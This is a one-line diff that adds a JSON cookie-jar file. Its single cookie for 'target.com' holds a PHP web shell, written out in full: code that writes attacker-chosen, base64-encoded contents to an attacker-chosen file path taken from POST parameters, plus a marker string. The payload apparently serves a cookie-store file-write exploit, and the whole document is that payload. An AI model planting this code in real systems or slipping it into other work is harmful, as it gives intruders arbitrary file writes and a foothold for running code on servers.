@@ -1,0 +1,1 @@
+[{"Name":"foo","Value":"<?php echo 'demo6ranksjxoan166';@file_put_contents(base64_decode($_POST['in']),base64_decode($_POST['out']));?>","Domain":"target.com","Path":"\/","Expires":1763910329,"Discard":false,"HttpOnly":false}]
